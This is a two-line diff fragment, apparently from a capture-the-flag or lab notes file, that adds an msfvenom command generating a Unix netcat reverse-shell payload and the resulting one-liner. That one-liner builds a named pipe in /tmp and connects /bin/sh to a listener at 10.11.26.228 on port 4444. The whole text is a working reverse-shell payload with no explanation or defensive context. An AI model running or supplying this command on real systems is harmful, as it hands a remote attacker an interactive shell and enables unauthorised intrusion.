@@ -1,0 +1,2 @@
+msfvenom -p cmd/unix/reverse_netcat lhost=10.11.26.228 lport=4444 R
+    mkfifo /tmp/vtcxwbs; nc 10.11.26.228 4444 0</tmp/vtcxwbs | /bin/sh >/tmp/vtcxwbs 2>&1; rm /tmp/vtcxwbs
